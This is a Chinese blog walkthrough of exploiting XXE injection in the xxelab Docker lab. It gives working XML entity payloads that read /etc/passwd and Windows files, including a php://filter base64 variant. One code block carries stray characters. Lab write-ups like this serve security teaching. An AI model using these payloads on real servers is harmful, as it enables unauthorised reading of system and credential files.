[docker](https://so.csdn.net/so/search?q=docker&spm=1001.2101.3001.7020)搜索xxe相关镜像包，然后pull下来，我这里pull的是：rrodrigo/xxelab 镜像包。

启动docker环境，映射到VPS的32776端口

![](https://img-blog.csdnimg.cn/2020010623115943.png)

访问

![](https://img-blog.csdnimg.cn/20200106231303731.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

输入注册数据，[抓包](https://so.csdn.net/so/search?q=%E6%8A%93%E5%8C%85&spm=1001.2101.3001.7020)重放。发现提交数据包采用 xml 格式传递，且邮箱有返回。

![](https://img-blog.csdnimg.cn/20200107113538872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

这里我们引用外部DTD实体，并且将email的值修改为引用外部实体的值 &file;   因为，返回包会返回email的值，所以返回包会读取我们引用的 /etc/passwd 的值返回给我们，造成了任意文件读取。

这里指定文件/etc/passwd，用不用 file 协议均可。

```
<?xml version="1.0" encoding="UTF-8"?>      
<!DOCTYPE test[      
	<!ENTITY file SYSTEM "/etc/passwd">      
]>      
<root><name>111</name><tel>222</tel><email>&file;</email><password>333</password></root>
```


![](https://img-blog.csdnimg.cn/2020010711382638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200107114040244.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

利用 base64 编码进行 xxe，防止有返回包验证。返回base64数据包，base64解码之。

```
<?xml version="1.0" encoding="UTF-8"?>      
<!DOCTYPE test[      
	<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">      
]>      
<root><name>111</name><tel>222</tel><email>&file;</email><password>333</password></root>
```


![](https://img-blog.csdnimg.cn/20200107114310731.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

如果服务器的Windows系统的话，

```
<?xml version="1.0" encoding="UTF-8"?>      
<!DOCTYPE test[      
	<!ENTITY file SYSTEM "C:/Users/mi/Desktop/1.txt">      
]>      
<root><name>111</name><tel>222</tel><email>&file;</email><password>333</password></root>       
用file协议      
<?xml version="1.0" encoding="UTF-8"?>      
<!DOCTYPE test[      1
	<!ENTITY file SYSTEM "file:///C:/Users/mi/Desktop/1.txt">      1
]>      1
<root><name>111</name><tel>222</tel><email>&file;</email><password>333</password></root>       1
用base64编码      1
<?xml version="1.0" encoding="UTF-8"?>      1
<!DOCTYPE test[      1
	<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=C:/Users/mi/Desktop/1.txt">      1
]>      1
<root><name>111</name><tel>222</tel><email>&file;</email><password>333</password></root>
```


![](https://img-blog.csdnimg.cn/20200318203431476.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200318203722677.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200318203701619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

相关文章：[XML和JSON数据格式](https://blog.csdn.net/qq_36119192/article/details/83047334 "XML和JSON数据格式")

                 [XXE(XML外部实体注入)](https://blog.csdn.net/qq_36119192/article/details/84993356 "XXE(XML外部实体注入)")